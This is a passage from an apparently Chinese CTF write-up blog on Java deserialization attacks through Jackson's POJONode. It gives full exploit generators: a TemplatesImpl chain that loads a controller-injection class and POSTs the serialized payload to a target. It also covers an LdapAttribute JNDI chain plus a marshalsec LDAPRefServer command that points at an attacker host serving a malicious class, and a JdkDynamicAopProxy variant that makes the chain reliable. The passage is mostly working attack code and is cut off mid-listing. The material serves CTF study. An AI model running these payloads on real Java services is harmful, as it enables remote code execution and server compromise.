+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;
+        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);
+        field.setAccessible(<span class="hljs-literal">true</span>);
+        field.set(obj, value);
+    &#125;
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doPOST</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] obj)</span> <span class="hljs-keyword">throws</span> Exception&#123;
+        <span class="hljs-type">HttpHeaders</span> <span class="hljs-variable">requestHeaders</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HttpHeaders</span>();
+        requestHeaders.set(<span class="hljs-string">&quot;Content-Type&quot;</span>, <span class="hljs-string">&quot;text/plain&quot;</span>);
+<span class="hljs-comment">//        URI url = new URI(&quot;http://neepusec.fun:27010/nomap&quot;);</span>
+        <span class="hljs-type">URI</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URI</span>(<span class="hljs-string">&quot;http://192.168.113.134:8080/bypassit&quot;</span>);
+        <span class="hljs-comment">//URI url = new URI(&quot;http://localhost:8080/bypassit&quot;);</span>
+        HttpEntity&lt;<span class="hljs-type">byte</span>[]&gt; requestEntity = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HttpEntity</span> &lt;&gt; (obj,requestHeaders);
+
+        <span class="hljs-type">RestTemplate</span> <span class="hljs-variable">restTemplate</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RestTemplate</span>();
+        ResponseEntity&lt;String&gt; res = restTemplate.postForEntity(url, requestEntity, String.class);
+        System.out.println(res.getBody());
+    &#125;
+
+&#125;
+</code></pre></div>
+
+<h2 id="NewStarCTF-2022-Rome"><a href="#NewStarCTF-2022-Rome" class="headerlink" title="NewStarCTF 2022  Rome"></a>NewStarCTF 2022  Rome</h2><p>很明显是打Rome链子，但我们就打jackson</p>
+<div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> jackson;
+
+<span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONArray;
+<span class="hljs-keyword">import</span> com.fasterxml.jackson.core.JsonProcessingException;
+<span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;
+<span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper.DefaultTyping;
+<span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;
+<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+<span class="hljs-keyword">import</span> org.springframework.http.HttpEntity;
+<span class="hljs-keyword">import</span> org.springframework.http.HttpHeaders;
+<span class="hljs-keyword">import</span> org.springframework.http.ResponseEntity;
+<span class="hljs-keyword">import</span> org.springframework.web.client.RestTemplate;
+
+<span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;
+<span class="hljs-keyword">import</span> javax.xml.transform.Templates;
+<span class="hljs-keyword">import</span> java.io.*;
+<span class="hljs-keyword">import</span> java.lang.reflect.Field;
+<span class="hljs-keyword">import</span> java.net.URI;
+<span class="hljs-keyword">import</span> java.nio.file.Files;
+<span class="hljs-keyword">import</span> java.nio.file.Paths;
+<span class="hljs-keyword">import</span> java.security.*;
+<span class="hljs-keyword">import</span> java.sql.SQLOutput;
+<span class="hljs-keyword">import</span> java.util.Base64;
+
+<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;
+
+        <span class="hljs-type">Templates</span> <span class="hljs-variable">templatesimpl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();
+
+<span class="hljs-comment">//        byte[] bytecodes = Files.readAllBytes(Paths.get(&quot;C:\\Users\\86136\\Desktop\\cc1\\target\\classes\\exp.class&quot;));</span>
+        <span class="hljs-type">byte</span>[] bytecodes = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;C:\\Users\\86136\\Desktop\\cc1\\target\\classes\\jackson\\InjectToController.class&quot;</span>));
+
+        setValue(templatesimpl,<span class="hljs-string">&quot;_name&quot;</span>,<span class="hljs-string">&quot;aaa&quot;</span>);
+        setValue(templatesimpl,<span class="hljs-string">&quot;_bytecodes&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][] &#123;bytecodes&#125;);
+        setValue(templatesimpl, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());
+
+
+        <span class="hljs-type">POJONode</span> <span class="hljs-variable">jsonNodes</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(templatesimpl);
+
+        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">exp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-number">1</span>);
+
+        setValue(exp,<span class="hljs-string">&quot;val&quot;</span>,jsonNodes);
+
+
+        System.out.println((serial(exp)));
+
+
+    &#125;
+
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">serial</span><span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> IOException &#123;
+        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();
+        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);
+        oos.writeObject(o);
+        oos.close();
+
+        <span class="hljs-type">String</span> <span class="hljs-variable">base64String</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(baos.toByteArray());
+        <span class="hljs-keyword">return</span> base64String;
+
+    &#125;
+
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deserial</span><span class="hljs-params">(String data)</span> <span class="hljs-keyword">throws</span> Exception &#123;
+        <span class="hljs-type">byte</span>[] base64decodedBytes = Base64.getDecoder().decode(data);
+        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bais</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(base64decodedBytes);
+        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bais);
+        ois.readObject();
+        ois.close();
+    &#125;
+
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;
+        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);
+        field.setAccessible(<span class="hljs-literal">true</span>);
+        field.set(obj, value);
+    &#125;
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doPOST</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] obj)</span> <span class="hljs-keyword">throws</span> Exception&#123;
+        <span class="hljs-type">HttpHeaders</span> <span class="hljs-variable">requestHeaders</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HttpHeaders</span>();
+        requestHeaders.set(<span class="hljs-string">&quot;Content-Type&quot;</span>, <span class="hljs-string">&quot;text/plain&quot;</span>);
+<span class="hljs-comment">//        URI url = new URI(&quot;http://neepusec.fun:27010/nomap&quot;);</span>
+        <span class="hljs-type">URI</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URI</span>(<span class="hljs-string">&quot;http://192.168.113.134:8080/bypassit&quot;</span>);
+        <span class="hljs-comment">//URI url = new URI(&quot;http://localhost:8080/bypassit&quot;);</span>
+        HttpEntity&lt;<span class="hljs-type">byte</span>[]&gt; requestEntity = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HttpEntity</span> &lt;&gt; (obj,requestHeaders);
+
+        <span class="hljs-type">RestTemplate</span> <span class="hljs-variable">restTemplate</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RestTemplate</span>();
+        ResponseEntity&lt;String&gt; res = restTemplate.postForEntity(url, requestEntity, String.class);
+        System.out.println(res.getBody());
+    &#125;
+
+&#125;
+</code></pre></div>
+
+<p>生成结果拿去URL编码后POST就行了</p>
+<h2 id="LdapAttribute链"><a href="#LdapAttribute链" class="headerlink" title="LdapAttribute链"></a>LdapAttribute链</h2><p>Real-World-CTF 2021</p>
+<p>主角就是<code>com.sun.jndi.ldap.LdapAttribute</code></p>
+<p>原题中作者是实战java1.4的古老版本挖掘的链子，但这个类java8也有，所以可以用</p>
+<p>看的是Boogipop的文章<a target="_blank" rel="noopener" href="https://boogipop.com/2023/05/16/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%9A%E6%9D%80Web%E9%A2%98/#LdapAttribute%E9%93%BE">Jackson反序列化通杀Web题(过时) - Boogiepop Doesn’t Laugh (boogipop.com)</a></p>
+<div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.node.ArrayNode;
+<span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.node.BaseJsonNode;
+<span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;
+<span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.node.ValueNode;
+<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+<span class="hljs-keyword">import</span> com.sun.rowset.JdbcRowSetImpl;
+<span class="hljs-keyword">import</span> javassist.*;
+<span class="hljs-keyword">import</span> org.springframework.http.HttpEntity;
+<span class="hljs-keyword">import</span> org.springframework.http.HttpHeaders;
+<span class="hljs-keyword">import</span> org.springframework.http.ResponseEntity;
+<span class="hljs-keyword">import</span> org.springframework.web.client.RestTemplate;
+
+<span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;
+<span class="hljs-keyword">import</span> javax.management.JMX;
+<span class="hljs-keyword">import</span> javax.management.remote.JMXServiceURL;
+<span class="hljs-keyword">import</span> javax.management.remote.rmi.RMIConnector;
+<span class="hljs-keyword">import</span> javax.naming.CompositeName;
+<span class="hljs-keyword">import</span> javax.sql.rowset.BaseRowSet;
+<span class="hljs-keyword">import</span> javax.xml.transform.Templates;
+<span class="hljs-keyword">import</span> java.io.*;
+<span class="hljs-keyword">import</span> java.lang.reflect.Constructor;
+<span class="hljs-keyword">import</span> java.lang.reflect.Field;
+<span class="hljs-keyword">import</span> java.lang.reflect.Method;
+<span class="hljs-keyword">import</span> java.net.URI;
+<span class="hljs-keyword">import</span> java.util.Base64;
+
+<span class="hljs-comment">/**</span>
+<span class="hljs-comment"> * Hello world!</span>
+<span class="hljs-comment"> *</span>
+<span class="hljs-comment"> */</span>
+<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LdapAttributeChain</span>
+&#123;
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">( String[] args )</span> <span class="hljs-keyword">throws</span> Exception &#123;
+        <span class="hljs-type">String</span> <span class="hljs-variable">ldapCtxUrl</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;ldap://127.0.0.1:1099/&quot;</span>;
+        <span class="hljs-type">Class</span> <span class="hljs-variable">ldapAttributeClazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;com.sun.jndi.ldap.LdapAttribute&quot;</span>);
+        <span class="hljs-type">Constructor</span> <span class="hljs-variable">ldapAttributeClazzConstructor</span> <span class="hljs-operator">=</span> ldapAttributeClazz.getDeclaredConstructor(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;String.class&#125;);
+        ldapAttributeClazzConstructor.setAccessible(<span class="hljs-literal">true</span>);
+        <span class="hljs-type">Object</span> <span class="hljs-variable">ldapAttribute</span> <span class="hljs-operator">=</span> ldapAttributeClazzConstructor.newInstance(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123;<span class="hljs-string">&quot;name&quot;</span>&#125;);
+        <span class="hljs-type">Field</span> <span class="hljs-variable">baseCtxUrlField</span> <span class="hljs-operator">=</span> ldapAttributeClazz.getDeclaredField(<span class="hljs-string">&quot;baseCtxURL&quot;</span>);
+        baseCtxUrlField.setAccessible(<span class="hljs-literal">true</span>);
+        baseCtxUrlField.set(ldapAttribute, ldapCtxUrl);
+        <span class="hljs-type">Field</span> <span class="hljs-variable">rdnField</span> <span class="hljs-operator">=</span> ldapAttributeClazz.getDeclaredField(<span class="hljs-string">&quot;rdn&quot;</span>);
+        rdnField.setAccessible(<span class="hljs-literal">true</span>);
+        rdnField.set(ldapAttribute, <span class="hljs-keyword">new</span> <span class="hljs-title class_">CompositeName</span>(<span class="hljs-string">&quot;a//b&quot;</span>));
+        <span class="hljs-type">POJONode</span> <span class="hljs-variable">jsonNodes</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(ldapAttribute);
+        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">exp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);
+        <span class="hljs-type">Field</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;javax.management.BadAttributeValueExpException&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);
+        val.setAccessible(<span class="hljs-literal">true</span>);
+        val.set(exp,jsonNodes);
+        deserial(serial(exp));
+    &#125;
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">serial</span><span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> IOException, NoSuchFieldException &#123;
+        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();
+        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);
+        <span class="hljs-comment">//Field writeReplaceMethod = ObjectStreamClass.class.getDeclaredField(&quot;writeReplaceMethod&quot;);</span>
+        <span class="hljs-comment">//writeReplaceMethod.setAccessible(true);</span>
+        oos.writeObject(o);
+        oos.close();
+
+        <span class="hljs-type">String</span> <span class="hljs-variable">base64String</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(baos.toByteArray());
+        <span class="hljs-keyword">return</span> base64String;
+
+    &#125;
+
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deserial</span><span class="hljs-params">(String data)</span> <span class="hljs-keyword">throws</span> Exception &#123;
+        <span class="hljs-type">byte</span>[] base64decodedBytes = Base64.getDecoder().decode(data);
+        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bais</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(base64decodedBytes);
+        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bais);
+        ois.readObject();
+        ois.close();
+    &#125;
+
+    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">Base64Encode</span><span class="hljs-params">(ByteArrayOutputStream bs)</span>&#123;
+        <span class="hljs-type">byte</span>[] encode = Base64.getEncoder().encode(bs.toByteArray());
+        <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(encode);
+        System.out.println(s);
+        System.out.println(s.length());
+    &#125;
+    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String field, Object arg)</span> <span class="hljs-keyword">throws</span> Exception&#123;
+        <span class="hljs-type">Field</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(field);
+        f.setAccessible(<span class="hljs-literal">true</span>);
+        f.set(obj, arg);
+    &#125;
+&#125;
+</code></pre></div>
+
+<h3 id="流程分析-1"><a href="#流程分析-1" class="headerlink" title="流程分析"></a>流程分析</h3><p>前面一样，invoke之后开始</p>
+<p>有两个get方法，我们使用下面这个</p>
+<p><img src="/../images/Jackson/image-20231118001138170.png" srcset="/img/loading.gif" lazyload alt="image-20231118001138170"></p>
+<p><img src="/../images/Jackson/image-20231118002202020.png" srcset="/img/loading.gif" lazyload alt="image-20231118002202020"></p>
+<p>这里能够jndi注入，出题人就是这里发现能够利用</p>
+<p><img src="/../images/Jackson/image-20231118002455283.png" srcset="/img/loading.gif" lazyload alt="image-20231118002455283"></p>
+<p><img src="/../images/Jackson/image-20231118002832449.png" srcset="/img/loading.gif" lazyload alt="image-20231118002832449"></p>
+<p>getUsingURL方法中会获取DN，但是获取的格式为<code>cn=,dn=</code>，假如我们加了后缀，我们后台收到的数据是：</p>
+<p><img src="/../images/Jackson/image-20231118002948992.png" srcset="/img/loading.gif" lazyload alt="image-20231118002948992"></p>
+<p>他默认会加一个a呢，这个是payload里<code>a//b</code>决定的，具体的是<code>a//b , rename xx &#39;a&#39;</code>调试的时候大概看到这个东西</p>
+<p>所以我们需要换个工具，如marshall，创建一个类名为a的恶意类，然后按照要求放置即可~</p>
+<p><code> java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://xx.xx.xx.xx:8000/#a 1099</code></p>
+<p>然后就能RCE</p>
+<h1 id="jacksn链子不稳定问题"><a href="#jacksn链子不稳定问题" class="headerlink" title="jacksn链子不稳定问题"></a>jacksn链子不稳定问题</h1><p><a target="_blank" rel="noopener" href="https://pankas.top/2023/10/04/%E5%85%B3%E4%BA%8Ejava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%ADjackson%E9%93%BE%E5%AD%90%E4%B8%8D%E7%A8%B3%E5%AE%9A%E9%97%AE%E9%A2%98/">关于java反序列化中jackson链子不稳定问题 (pankas.top)</a></p>
+<p>虽然我暂时没遇到过报错，但还是多了解一下</p>
+<p>有时会遇到这样的报错</p>
+<div class="code-wrapper"><pre><code class="hljs stylus">com<span class="hljs-selector-class">.fasterxml</span><span class="hljs-selector-class">.jackson</span><span class="hljs-selector-class">.databind</span><span class="hljs-selector-class">.JsonMappingException</span>: (was java<span class="hljs-selector-class">.lang</span>.NullPointerException) (through reference chain: com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.org</span><span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.xalan</span><span class="hljs-selector-class">.internal</span><span class="hljs-selector-class">.xsltc</span><span class="hljs-selector-class">.trax</span><span class="hljs-selector-class">.TemplatesImpl</span><span class="hljs-selector-attr">[<span class="hljs-string">&quot;stylesheetDOM&quot;</span>]</span>)</code></pre></div>
+
+
+
+<h2 id="根本原因"><a href="#根本原因" class="headerlink" title="根本原因"></a>根本原因</h2><p><img src="/../images/Jackson/image-20231118154029847.png" srcset="/img/loading.gif" lazyload alt="image-20231118154029847"></p>
+<p><code>props</code>数组中每个值是<code>BeanPropertyWriter</code> 类型对象，之后循环调用其中的<code>serializeAsField</code> 方法来执行对应方法。而另一边通过分析，<code>props</code>是通过反射 <code>getDeclaredMethods</code> 方法获取到的 ，因此<code>props</code>数组顺序是不确定的</p>
+<p>并且当第一次出错后，后面就不会成功，这是因为jackson这个 <code>com.fasterxml.jackson.databind.SerializerProvider#findTypedValueSerializer(java.lang.Class&lt;?&gt;, boolean, com.fasterxml.jackson.databind.BeanProperty)</code> 中获取序列化器有缓存机制</p>
+<h2 id="流程分析-2"><a href="#流程分析-2" class="headerlink" title="流程分析"></a>流程分析</h2><p>找清楚这个<code>props</code> 数组的顺序，一路追踪这个变量，发现其根源是在 <code>com.fasterxml.jackson.databind.introspect.POJOPropertiesCollector#collectAll</code>中调用 <code>_addMethods(props)</code> 方法来获取相关 getter 方法，之后将其添加到 <code>prpos</code> 属性中。</p>
+<p><img src="/../images/Jackson/image-20231118155057092.png" srcset="/img/loading.gif" lazyload alt="image-20231118155057092"></p>
+<h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/u/68975">https://xz.aliyun.com/u/68975</a></p>
+<p><code>org.springframework.aop.framework.JdkDynamicAopProxy</code> 来解决jackson链子的随机性问题</p>
+<p>动态代理是十分强大的，被代理对象所能调用的方法取决与我们所给的接口，其功能取决与我们所给的 handler。当我们用java的反射 <code>getDeclaredMethods</code> 方法去获取其所有方法时也是根据我们提供的接口去获取的</p>
+<p>demo</p>
+<div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> jackson;
+
+<span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;
+<span class="hljs-keyword">import</span> java.lang.reflect.Method;
+<span class="hljs-keyword">import</span> java.lang.reflect.Proxy;
+
+<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Proxy_test</span> &#123;
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;
+        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> Proxy.newProxyInstance(ProxyTest.class.getClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;test1.class, test2.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyHandler</span>());
+        <span class="hljs-keyword">for</span>(Method m: o.getClass().getDeclaredMethods())&#123;
+            System.out.println(m.getName());
+        &#125;
+    &#125;
+&#125;
+
+<span class="hljs-keyword">interface</span> <span class="hljs-title class_">test1</span>&#123;
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">say456</span><span class="hljs-params">()</span>;
+&#125;
+<span class="hljs-keyword">interface</span> <span class="hljs-title class_">test2</span>&#123;
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test123</span><span class="hljs-params">()</span>;
+&#125;
+
+<span class="hljs-keyword">class</span> <span class="hljs-title class_">ProxyTest</span> &#123;
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">eat</span><span class="hljs-params">()</span>&#123;
+        System.out.println(<span class="hljs-string">&quot;eat noting&quot;</span>);
+    &#125;
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test</span><span class="hljs-params">()</span>&#123;
+        System.out.println(<span class="hljs-string">&quot;nonono&quot;</span>);
+    &#125;
+    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">(String a)</span>&#123;
+        <span class="hljs-keyword">return</span> a;
+    &#125;
+&#125;
+
+<span class="hljs-keyword">class</span> <span class="hljs-title class_">MyHandler</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">InvocationHandler</span>&#123;
+    <span class="hljs-meta">@Override</span>
+    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> <span class="hljs-keyword">throws</span> Throwable &#123;
+        System.out.println(<span class="hljs-string">&quot;invoke dynamic proxy handler&quot;</span>);
+        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
+    &#125;
+&#125;
+</code></pre></div>
+
+<p><img src="/../images/Jackson/image-20231118161431828.png" srcset="/img/loading.gif" lazyload alt="image-20231118161431828"></p>
+<p>所以主要就是看所给的接口和handler就可以了。</p>
+<p><code>javax.xml.transform.Templates</code> 接口其只有 <code>newTransformer</code> 和 <code>getOutputProperties</code> 这个两个方法，让他作为我们代理所需的接口，这样最终通过 <code>getDeclaredMethods</code> 获取到的方法就只有 <code>newTransformer</code> 和 <code>getOutputProperties</code> 了，那么最终获得的getter方法便只有 <code>getOutputProperties</code> 了。</p>
+<p>关于这个<code>Templates</code>接口，Boogipop大佬提到<code>TemplatesImpl templatesimpl = new TemplatesImpl();</code>最好换成<code>Templates templatesimpl = new TemplatesImpl();</code>能避免一些错误</p>
+<p><img src="/../images/Jackson/image-20231118162500653.png" srcset="/img/loading.gif" lazyload alt="image-20231118162500653"></p>
+<p><img src="/../images/Jackson/image-20231118162554090.png" srcset="/img/loading.gif" lazyload alt="image-20231118162554090"></p>
+<p>这里的 target 获取到的对象由上面所说的 <code>advised</code> 属性得到，我们将所需的 <code>TemplatesImpl</code> 的对象用 <code>org.springframework.aop.framework.AdvisedSupport</code> 封装即可</p>
+<p><img src="/../images/Jackson/image-20231118162614666.png" srcset="/img/loading.gif" lazyload alt="image-20231118162614666"></p>
+<p><img src="/../images/Jackson/image-20231118162632689.png" srcset="/img/loading.gif" lazyload alt="image-20231118162632689"></p>
+<h3 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h3><div class="code-wrapper"><pre><code class="hljs java">Class&lt;?&gt; clazz = Class.forName(<span class="hljs-string">&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;</span>);
+Constructor&lt;?&gt; cons = clazz.getDeclaredConstructor(AdvisedSupport.class);
+cons.setAccessible(<span class="hljs-literal">true</span>);
+<span class="hljs-type">AdvisedSupport</span> <span class="hljs-variable">advisedSupport</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AdvisedSupport</span>();
+advisedSupport.setTarget(templatesImpl);
+<span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> (InvocationHandler) cons.newInstance(advisedSupport);
+<span class="hljs-type">Object</span> <span class="hljs-variable">proxyObj</span> <span class="hljs-operator">=</span> Proxy.newProxyInstance(clazz.getClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;, handler);
+<span class="hljs-type">POJONode</span> <span class="hljs-variable">jsonNodes</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(proxyObj);</code></pre></div>
+
+<div class="code-wrapper"><pre><code class="hljs reasonml">package jackson;
+
+import com.fasterxml.jackson.databind.node.POJONode;
+import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import javassist.*;
+import org.springframework.aop.framework.AdvisedSupport;
+import javax.management.BadAttributeValueExpException;
+import javax.xml.transform.Templates;
+import java.io.*;
+import java.lang.reflect.*;
+import java.util.Base64;
+
+public <span class="hljs-keyword">class</span> avoid_error &#123;
+
+    public static void main(String<span class="hljs-literal">[]</span> args) throws Exception &#123;
+
+        ClassPool pool = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ClassPool</span>.</span></span>get<span class="hljs-constructor">Default()</span>;
+        CtClass ctClass0 = pool.get(<span class="hljs-string">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);
+        CtMethod writeReplace = ctClass0.get<span class="hljs-constructor">DeclaredMethod(<span class="hljs-string">&quot;writeReplace&quot;</span>)</span>;
+        ctClass0.remove<span class="hljs-constructor">Method(<span class="hljs-params">writeReplace</span>)</span>;
+        ctClass0.<span class="hljs-keyword">to</span><span class="hljs-constructor">Class()</span>;
+
+        CtClass ctClass = pool.make<span class="hljs-constructor">Class(<span class="hljs-string">&quot;a&quot;</span>)</span>;
+        CtClass superClass = pool.get(<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AbstractTranslet</span>.</span></span><span class="hljs-keyword">class</span>.get<span class="hljs-constructor">Name()</span>);
+        ctClass.set<span class="hljs-constructor">Superclass(<span class="hljs-params">superClass</span>)</span>;
+        CtConstructor constructor = <span class="hljs-keyword">new</span> <span class="hljs-constructor">CtConstructor(<span class="hljs-params">new</span> CtClass[]&#123;&#125;,<span class="hljs-params">ctClass</span>)</span>;
